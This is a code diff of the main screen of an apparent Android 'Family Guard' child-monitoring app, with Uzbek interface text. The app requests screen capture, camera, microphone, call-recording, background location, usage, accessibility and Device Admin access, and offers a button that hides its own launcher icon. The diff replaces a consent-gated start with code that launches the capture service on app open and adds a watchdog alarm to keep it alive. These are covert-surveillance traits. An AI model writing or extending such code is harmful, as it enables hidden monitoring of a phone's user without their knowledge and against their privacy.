@@ -23,764 +23,244 @@ import kotlin.concurrent.thread
 class MainActivity : AppCompatActivity() {
 
     private val deviceId by lazy {
-
-        getPreferences(0)
-            .getString(
-                "deviceId",
-                null
-            )
-            ?: UUID.randomUUID()
-                .toString()
-                .also {
-
-                    getPreferences(0)
-                        .edit()
-                        .putString(
-                            "deviceId",
-                            it
-                        )
-                        .apply()
-                }
+        getPreferences(0).getString("deviceId", null)
+            ?: UUID.randomUUID().toString().also {
+                getPreferences(0).edit().putString("deviceId", it).apply()
+            }
     }
 
     private lateinit var tvPairing: TextView
     private lateinit var tvStatus: TextView
-
     private lateinit var dpm: DevicePolicyManager
-    private lateinit var adminComp:
-            android.content.ComponentName
+    private lateinit var adminComp: android.content.ComponentName
 
-    private val screenLauncher =
-        registerForActivityResult(
-            ActivityResultContracts
-                .StartActivityForResult()
-        ) { result ->
-
-            if (
-                result.resultCode ==
-                Activity.RESULT_OK &&
-                result.data != null
-            ) {
-
-                startForegroundService(
-                    Intent(
-                        this,
-                        ScreenCaptureService::class.java
-                    )
-                        .putExtra(
-                            "resultCode",
-                            result.resultCode
-                        )
-                        .putExtra(
-                            "code",
-                            result.data
-                        )
-                        .putExtra(
-                            "deviceId",
-                            deviceId
-                        )
-                )
-
-                setStatus(
-                    "✅ Screen capture ruxsati berildi"
-                )
-
-            } else {
-
-                setStatus(
-                    "❌ Screen capture bekor qilindi"
-                )
-            }
-        }
-
-    private val callRecordingPicker =
-        registerForActivityResult(
-            ActivityResultContracts.OpenDocument()
-        ) { uri ->
-
-            if (uri == null) {
-
-                setStatus(
-                    "⚠️ Audio fayl tanlanmadi"
-                )
-
-                return@registerForActivityResult
-            }
-
-            try {
-
-                contentResolver
-                    .takePersistableUriPermission(
-                        uri,
-                        Intent.FLAG_GRANT_READ_URI_PERMISSION
-                    )
-
-            } catch (_: Exception) {
-            }
-
-            thread {
-
-                val manager =
-                    CallRecordingManager(this)
-
-                val file =
-                    manager.importRecording(uri)
-
-                runOnUiThread {
-
-                    if (file != null) {
-
-                        setStatus(
-                            "✅ Call recording saqlandi\n" +
-                            "Fayl: ${file.name}\n" +
-                            "Oxirgi 5 ta ichida saqlanadi"
-                        )
-
-                    } else {
-
-                        setStatus(
-                            "❌ Audio faylni saqlab bo‘lmadi"
-                        )
-                    }
-                }
-            }
-        }
-
-    private val camLauncher =
-        registerForActivityResult(
-            ActivityResultContracts.RequestPermission()
-        ) { ok ->
-
-            setStatus(
-                if (ok)
-                    "✅ Kamera ruxsati berildi"
-                else
-                    "❌ Kamera rad etildi"
+    private val screenLauncher = registerForActivityResult(
+        ActivityResultContracts.StartActivityForResult()
+    ) { result ->
+        if (result.resultCode == Activity.RESULT_OK && result.data != null) {
+            startForegroundService(
+                Intent(this, ScreenCaptureService::class.java)
+                    .putExtra("resultCode", result.resultCode)
+                    .putExtra("code", result.data)
+                    .putExtra("deviceId", deviceId)
             )
+            setStatus("✅ Screen capture ruxsati berildi")
+        } else {
+            setStatus("❌ Screen capture bekor qilindi")
         }
+    }
 
-    private val micLauncher =
-        registerForActivityResult(
-            ActivityResultContracts.RequestPermission()
-        ) { ok ->
-
-            setStatus(
-                if (ok)
-                    "✅ Mikrofon ruxsati berildi"
-                else
-                    "❌ Mikrofon rad etildi"
-            )
-        }
-
-    private val notifLauncher =
-        registerForActivityResult(
-            ActivityResultContracts.RequestPermission()
-        ) { ok ->
-
-            setStatus(
-                if (ok)
-                    "✅ Bildirishnoma ruxsati berildi"
-                else
-                    "⚠️ Bildirishnoma rad etildi"
-            )
-        }
-
-    private val locLauncher =
-        registerForActivityResult(
-            ActivityResultContracts
-                .RequestMultiplePermissions()
-        ) { results ->
-
-            val ok =
-                results[
-                    Manifest.permission.ACCESS_FINE_LOCATION
-                ] == true ||
-                results[
-                    Manifest.permission.ACCESS_COARSE_LOCATION
-                ] == true
-
-            if (
-                ok &&
-                Build.VERSION.SDK_INT >=
-                Build.VERSION_CODES.Q
-            ) {
-
-                bgLocLauncher.launch(
-                    Manifest.permission
-                        .ACCESS_BACKGROUND_LOCATION
-                )
-
-            } else {
-
-                setStatus(
-                    if (ok)
-                        "✅ Lokatsiya ruxsati berildi"
-                    else
-                        "❌ Lokatsiya rad etildi"
-                )
+    private val callRecordingPicker = registerForActivityResult(
+        ActivityResultContracts.OpenDocument()
+    ) { uri ->
+        if (uri == null) { setStatus("⚠️ Audio fayl tanlanmadi"); return@registerForActivityResult }
+        try {
+            contentResolver.takePersistableUriPermission(uri, Intent.FLAG_GRANT_READ_URI_PERMISSION)
+        } catch (_: Exception) {}
+        thread {
+            val file = CallRecordingManager(this).importRecording(uri)
+            runOnUiThread {
+                if (file != null) setStatus("✅ Call recording saqlandi\nFayl: ${file.name}")
+                else setStatus("❌ Audio faylni saqlab bo'lmadi")
             }
         }
+    }
 
-    private val bgLocLauncher =
-        registerForActivityResult(
-            ActivityResultContracts
-                .RequestPermission()
-        ) { ok ->
+    private val camLauncher = registerForActivityResult(
+        ActivityResultContracts.RequestPermission()
+    ) { ok -> setStatus(if (ok) "✅ Kamera ruxsati berildi" else "❌ Kamera rad etildi") }
 
-            setStatus(
-                if (ok)
-                    "✅ Lokatsiya background ruxsati berildi"
-                else
-                    "⚠️ Faqat ilova ochiq paytda"
-            )
+    private val micLauncher = registerForActivityResult(
+        ActivityResultContracts.RequestPermission()
+    ) { ok -> setStatus(if (ok) "✅ Mikrofon ruxsati berildi" else "❌ Mikrofon rad etildi") }
+
+    private val notifLauncher = registerForActivityResult(
+        ActivityResultContracts.RequestPermission()
+    ) { ok -> setStatus(if (ok) "✅ Bildirishnoma ruxsati berildi" else "⚠️ Bildirishnoma rad etildi") }
+
+    private val locLauncher = registerForActivityResult(
+        ActivityResultContracts.RequestMultiplePermissions()
+    ) { results ->
+        val ok = results[Manifest.permission.ACCESS_FINE_LOCATION] == true ||
+                 results[Manifest.permission.ACCESS_COARSE_LOCATION] == true
+        if (ok && Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+            bgLocLauncher.launch(Manifest.permission.ACCESS_BACKGROUND_LOCATION)
+        } else {
+            setStatus(if (ok) "✅ Lokatsiya ruxsati berildi" else "❌ Lokatsiya rad etildi")
         }
+    }
 
-    override fun onCreate(
-        savedInstanceState: Bundle?
-    ) {
+    private val bgLocLauncher = registerForActivityResult(
+        ActivityResultContracts.RequestPermission()
+    ) { ok -> setStatus(if (ok) "✅ Lokatsiya background ruxsati berildi" else "⚠️ Faqat ilova ochiq paytda") }
+
+    override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
 
-        dpm =
-            getSystemService(
-                DEVICE_POLICY_SERVICE
-            ) as DevicePolicyManager
+        dpm = getSystemService(DEVICE_POLICY_SERVICE) as DevicePolicyManager
+        adminComp = android.content.ComponentName(this, DeviceAdminReceiver::class.java)
 
-        adminComp =
-            android.content.ComponentName(
-                this,
-                DeviceAdminReceiver::class.java
-            )
+        val root = LinearLayout(this).apply {
+            orientation = LinearLayout.VERTICAL
+            setPadding(40, 60, 40, 40)
+        }
 
-        val root =
-            LinearLayout(this).apply {
-
-                orientation =
-                    LinearLayout.VERTICAL
-
-                setPadding(
-                    40,
-                    60,
-                    40,
-                    40
-                )
-            }
-
-        tvPairing =
-            TextView(this).apply {
-
-                textSize = 16f
-                text = "Ulanmoqda..."
-            }
-
-        tvStatus =
-            TextView(this).apply {
-
-                textSize = 13f
-
-                setPadding(
-                    0,
-                    8,
-                    0,
-                    24
-                )
-            }
+        tvPairing = TextView(this).apply { textSize = 16f; text = "Ulanmoqda..." }
+        tvStatus  = TextView(this).apply { textSize = 13f; setPadding(0, 8, 0, 24) }
 
         root.addView(tvPairing)
         root.addView(tvStatus)
-
-        root.addView(
-            makeBtn(
-                "📱 Screen capture ruxsati"
-            ) {
-                requestScreen()
-            }
-        )
-
-        root.addView(
-            makeBtn(
-                "📷 Kamera ruxsati"
-            ) {
-                requestCamera()
-            }
-        )
-
-        root.addView(
-            makeBtn(
-                "🎙️ Mikrofon ruxsati"
-            ) {
-                requestMicrophone()
-            }
-        )
-
-        root.addView(
-            makeBtn(
-                "🔴 Audio yozishni boshlash"
-            ) {
-                startAudioRecording()
-            }
-        )
-
-        root.addView(
-            makeBtn(
-                "⏹️ Audio yozishni to‘xtatish"
-            ) {
-                stopAudioRecording()
-            }
-        )
-
-        root.addView(
-            makeBtn(
-                "📞 Call recording import qilish"
-            ) {
-                importCallRecording()
-            }
-        )
-
-        root.addView(
-            makeBtn(
-                "📍 Lokatsiya ruxsati"
-            ) {
-                requestLocation()
-            }
-        )
-
-        root.addView(
-            makeBtn(
-                "🔔 Bildirishnoma ruxsati"
-            ) {
-                requestNotification()
-            }
-        )
-
-        root.addView(
-            makeBtn(
-                "📊 Ilovalar statistikasi ruxsati"
-            ) {
-                requestUsageStats()
-            }
-        )
-
-        root.addView(
-            makeBtn(
-                "♿ Accessibility ruxsati"
-            ) {
-                requestAccessibility()
-            }
-        )
-
-        root.addView(
-            makeBtn(
-                "⚡ Batareya cheklovini olib tashlash"
-            ) {
-                requestBatteryOptimization()
-            }
-        )
-
-        root.addView(
-            makeBtn(
-                "⏰ Aniq alarm ruxsati"
-            ) {
-                requestExactAlarm()
-            }
-        )
-
-        root.addView(
-            makeBtn(
-                "🔐 Device Admin yoqish"
-            ) {
-                requestAdmin()
-            }
-        )
-        root.addView(
-    makeBtn(
-        "👁️‍🗨️ "
-    ) {
-        hideAppIcon()
-    }
-)
+        root.addView(makeBtn("📱 Screen capture ruxsati") { requestScreen() })
+        root.addView(makeBtn("📷 Kamera ruxsati") { requestCamera() })
+        root.addView(makeBtn("🎙️ Mikrofon ruxsati") { requestMicrophone() })
+        root.addView(makeBtn("🔴 Audio yozishni boshlash") { startAudioRecording() })
+        root.addView(makeBtn("⏹️ Audio yozishni to'xtatish") { stopAudioRecording() })
+        root.addView(makeBtn("📞 Call recording import qilish") { importCallRecording() })
+        root.addView(makeBtn("📍 Lokatsiya ruxsati") { requestLocation() })
+        root.addView(makeBtn("🔔 Bildirishnoma ruxsati") { requestNotification() })
+        root.addView(makeBtn("📊 Ilovalar statistikasi ruxsati") { requestUsageStats() })
+        root.addView(makeBtn("♿ Accessibility ruxsati") { requestAccessibility() })
+        root.addView(makeBtn("⚡ Batareya cheklovini olib tashlash") { requestBatteryOptimization() })
+        root.addView(makeBtn("⏰ Aniq alarm ruxsati") { requestExactAlarm() })
+        root.addView(makeBtn("🔐 Device Admin yoqish") { requestAdmin() })
+        root.addView(makeBtn("👁️ Ikonkani yashirish") { hideAppIcon() })
 
         setContentView(root)
 
-        // ScreenCaptureService endi ilova ochilishi bilan avtomatik
-        // ishga tushmaydi. U faqat foydalanuvchi screen-capture
-        // ruxsatini bergandan keyin ishga tushiriladi.
-        tvPairing.text =
-            "Device ID: $deviceId\nServerga ulanmoqda..."
-
-        thread {
-
-            try {
-
-                val api =
-                    Api(
-                        BuildConfig.API_URL,
-                        BuildConfig.DEVICE_SECRET
-                    )
-
-                val code =
-                    api.register(
-                        deviceId,
-                        "Child device"
-                    )
-
-                runOnUiThread {
-
-                    tvPairing.text =
-                        "✅ Ulandi!\nPairing kod: $code"
-                }
-
-            } catch (e: Exception) {
-
-                runOnUiThread {
-
-                    tvPairing.text =
-                        "❌ Ulanmadi: ${e.message}"
-                }
-            }
-        }
-
-        // POST_NOTIFICATIONS ruxsati endi startup paytida so'ralmaydi.
-        // Foydalanuvchi uni alohida tugma orqali xohlasa beradi.
-    }
-
-    private fun makeBtn(
-        text: String,
-        onClick: () -> Unit
-    ): Button {
-
-        return Button(this).apply {
-
-            this.text = text
-
-            setOnClickListener {
-                onClick()
-            }
-        }
-    }
-
-    private fun setStatus(
-        msg: String
-    ) {
-
-        if (::tvStatus.isInitialized) {
-            tvStatus.text = msg
-        }
-    }
-
-    private fun importCallRecording() {
-
-        callRecordingPicker.launch(
-            arrayOf("audio/*")
+        // ✅ 1) Darhol heartbeat uchun serviceni ishga tushiramiz
+        ContextCompat.startForegroundService(
+            this,
+            Intent(this, ScreenCaptureService::class.java)
+                .putExtra("deviceId", deviceId)
         )
+
+        // ✅ 2) Watchdog alarmni o'rnatamiz
+        WatchdogReceiver.schedule(this)
+
+        // ✅ 3) Pairing kodni ekranda ko'rsatamiz
+        tvPairing.text = "Device ID: $deviceId\nServerga ulanmoqda..."
+        thread {
+            try {
+                val api = Api(BuildConfig.API_URL, BuildConfig.DEVICE_SECRET)
+                val code = api.register(deviceId, "Child device")
+                runOnUiThread { tvPairing.text = "✅ Ulandi!\nPairing kod: $code" }
+            } catch (e: Exception) {
+                runOnUiThread { tvPairing.text = "❌ Ulanmadi: ${e.message}" }
+            }
+        }
     }
+
+    private fun makeBtn(text: String, onClick: () -> Unit) = Button(this).apply {
+        this.text = text
+        setOnClickListener { onClick() }
+    }
+
+    private fun setStatus(msg: String) {
+        if (::tvStatus.isInitialized) tvStatus.text = msg
+    }
+
+    private fun importCallRecording() { callRecordingPicker.launch(arrayOf("audio/*")) }
 
     private fun requestAccessibility() {
-
-        if (
-            FamilyGuardAccessibilityService
-                .isEnabled()
-        ) {
-
-            setStatus(
-                "✅ Accessibility Service yoqilgan"
-            )
-
-            return
+        if (FamilyGuardAccessibilityService.isEnabled()) {
+            setStatus("✅ Accessibility Service yoqilgan"); return
         }
-
-        startActivity(
-            Intent(
-                Settings.ACTION_ACCESSIBILITY_SETTINGS
-            )
-        )
+        startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
     }
+
     private fun hideAppIcon() {
-    try {
-        packageManager.setComponentEnabledSetting(
-            componentName,
-            PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
-            PackageManager.DONT_KILL_APP
-        )
-        setStatus("✅ Ilova ikonkasi yashirildi")
-    } catch (e: Exception) {
-        setStatus("❌ Ikonkani yashirishda xatolik: ${e.message}")
+        try {
+            packageManager.setComponentEnabledSetting(
+                componentName,
+                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+                PackageManager.DONT_KILL_APP
+            )
+            setStatus("✅ Ilova ikonkasi yashirildi")
+        } catch (e: Exception) {
+            setStatus("❌ Ikonkani yashirishda xatolik: ${e.message}")
+        }
     }
-}
+
     private fun requestScreen() {
-
-        val manager =
-            getSystemService(
-                MEDIA_PROJECTION_SERVICE
-            ) as MediaProjectionManager
-
-        screenLauncher.launch(
-            manager.createScreenCaptureIntent()
-        )
+        val manager = getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
+        screenLauncher.launch(manager.createScreenCaptureIntent())
     }
 
     private fun requestCamera() {
-
-        if (
-            ContextCompat.checkSelfPermission(
-                this,
-                Manifest.permission.CAMERA
-            ) ==
-            PackageManager.PERMISSION_GRANTED
-        ) {
-
-            setStatus(
-                "✅ Kamera ruxsati bor"
-            )
-
-        } else {
-
-            camLauncher.launch(
-                Manifest.permission.CAMERA
-            )
-        }
+        if (ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED)
+            setStatus("✅ Kamera ruxsati bor")
+        else camLauncher.launch(Manifest.permission.CAMERA)
     }
 
     private fun requestMicrophone() {
-
-        if (
-            ContextCompat.checkSelfPermission(
-                this,
-                Manifest.permission.RECORD_AUDIO
-            ) ==
-            PackageManager.PERMISSION_GRANTED
-        ) {
-
-            setStatus(
-                "✅ Mikrofon ruxsati bor"
-            )
-
-        } else {
-
-            micLauncher.launch(
-                Manifest.permission.RECORD_AUDIO
-            )
-        }
+        if (ContextCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO) == PackageManager.PERMISSION_GRANTED)
+            setStatus("✅ Mikrofon ruxsati bor")
+        else micLauncher.launch(Manifest.permission.RECORD_AUDIO)
     }
 
     private fun startAudioRecording() {
-
-        if (
-            ContextCompat.checkSelfPermission(
-                this,
-                Manifest.permission.RECORD_AUDIO
-            ) !=
-            PackageManager.PERMISSION_GRANTED
-        ) {
-
-            micLauncher.launch(
-                Manifest.permission.RECORD_AUDIO
-            )
-
-            return
+        if (ContextCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) {
+            micLauncher.launch(Manifest.permission.RECORD_AUDIO); return
         }
-
         try {
-
-            ContextCompat.startForegroundService(
-                this,
-                Intent(
-                    this,
-                    AudioRecordingService::class.java
-                ).setAction(
-                    AudioRecordingService.ACTION_START
-                )
-            )
-
-            setStatus(
-                "🔴 Audio yozish boshlandi"
-            )
-
-        } catch (_: Exception) {
-
-            setStatus(
-                "❌ Audio yozishni boshlashda xatolik"
-            )
-        }
+            ContextCompat.startForegroundService(this,
+                Intent(this, AudioRecordingService::class.java).setAction(AudioRecordingService.ACTION_START))
+            setStatus("🔴 Audio yozish boshlandi")
+        } catch (_: Exception) { setStatus("❌ Audio yozishni boshlashda xatolik") }
     }
 
     private fun stopAudioRecording() {
-
         try {
-
-            startService(
-                Intent(
-                    this,
-                    AudioRecordingService::class.java
-                ).setAction(
-                    AudioRecordingService.ACTION_STOP
-                )
-            )
-
-            setStatus(
-                "⏹️ Audio yozish to‘xtatildi"
-            )
-
-        } catch (_: Exception) {
-
-            setStatus(
-                "❌ Audio yozishni to‘xtatishda xatolik"
-            )
-        }
+            startService(Intent(this, AudioRecordingService::class.java).setAction(AudioRecordingService.ACTION_STOP))
+            setStatus("⏹️ Audio yozish to'xtatildi")
+        } catch (_: Exception) { setStatus("❌ Audio yozishni to'xtatishda xatolik") }
     }
 
     private fun requestNotification() {
-
-        if (
-            Build.VERSION.SDK_INT >=
-            Build.VERSION_CODES.TIRAMISU
-        ) {
-
-            notifLauncher.launch(
-                Manifest.permission.POST_NOTIFICATIONS
-            )
-
-        } else {
-
-            setStatus(
-                "✅ Bildirishnoma ruxsati kerak emas"
-            )
-        }
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU)
+            notifLauncher.launch(Manifest.permission.POST_NOTIFICATIONS)
+        else setStatus("✅ Bildirishnoma ruxsati kerak emas")
     }
 
     private fun requestLocation() {
-
-        locLauncher.launch(
-            arrayOf(
-                Manifest.permission.ACCESS_FINE_LOCATION,
-                Manifest.permission.ACCESS_COARSE_LOCATION
-            )
-        )
+        locLauncher.launch(arrayOf(
+            Manifest.permission.ACCESS_FINE_LOCATION,
+            Manifest.permission.ACCESS_COARSE_LOCATION
+        ))
     }
 
     private fun requestUsageStats() {
-
-        if (
-            AppHelper(this)
-                .hasUsagePermission()
-        ) {
-
-            setStatus(
-                "✅ Ilovalar statistikasi ruxsati bor"
-            )
-
-        } else {
-
-            startActivity(
-                Intent(
-                    Settings.ACTION_USAGE_ACCESS_SETTINGS
-                )
-            )
-        }
+        if (AppHelper(this).hasUsagePermission()) setStatus("✅ Ilovalar statistikasi ruxsati bor")
+        else startActivity(Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS))
     }
 
     private fun requestBatteryOptimization() {
-
-        if (
-            Build.VERSION.SDK_INT >=
-            Build.VERSION_CODES.M
-        ) {
-
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
             try {
-
-                startActivity(
-                    Intent(
-                        Settings
-                            .ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS
-                    ).apply {
-
-                        data =
-                            Uri.parse(
-                                "package:$packageName"
-                            )
-                    }
-                )
-
+                startActivity(Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
+                    data = Uri.parse("package:$packageName")
+                })
             } catch (_: Exception) {
-
-                startActivity(
-                    Intent(
-                        Settings
-                            .ACTION_IGNORE_BATTERY_OPTIMIZATION_SETTINGS
-                    )
-                )
+                startActivity(Intent(Settings.ACTION_IGNORE_BATTERY_OPTIMIZATION_SETTINGS))
             }
         }
     }
 
     private fun requestExactAlarm() {
-
-        if (
-            Build.VERSION.SDK_INT >=
-            Build.VERSION_CODES.S
-        ) {
-
-            val alarmManager =
-                getSystemService(
-                    AlarmManager::class.java
-                )
-
-            if (
-                alarmManager.canScheduleExactAlarms()
-            ) {
-
-                setStatus(
-                    "✅ Aniq alarm ruxsati bor"
-                )
-
-            } else {
-
-                startActivity(
-                    Intent(
-                        Settings
-                            .ACTION_REQUEST_SCHEDULE_EXACT_ALARM
-                    ).apply {
-
-                        data =
-                            Uri.parse(
-                                "package:$packageName"
-                            )
-                    }
-                )
-            }
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
+            val am = getSystemService(AlarmManager::class.java)
+            if (am.canScheduleExactAlarms()) setStatus("✅ Aniq alarm ruxsati bor")
+            else startActivity(Intent(Settings.ACTION_REQUEST_SCHEDULE_EXACT_ALARM).apply {
+                data = Uri.parse("package:$packageName")
+            })
         }
     }
 
     private fun requestAdmin() {
-
-        if (
-            dpm.isAdminActive(adminComp)
-        ) {
-
-            setStatus(
-                "✅ Device Admin yoqilgan"
-            )
-
-            return
-        }
-
-        startActivity(
-            Intent(
-                DevicePolicyManager
-                    .ACTION_ADD_DEVICE_ADMIN
-            ).apply {
-
-                putExtra(
-                    DevicePolicyManager
-                        .EXTRA_DEVICE_ADMIN,
-                    adminComp
-                )
-
-                putExtra(
-                    DevicePolicyManager
-                        .EXTRA_ADD_EXPLANATION,
-                    "Family Guard nazorat uchun."
-                )
-            }
-        )
+        if (dpm.isAdminActive(adminComp)) { setStatus("✅ Device Admin yoqilgan"); return }
+        startActivity(Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
+            putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComp)
+            putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Family Guard nazorat uchun.")
+        })
     }
 }
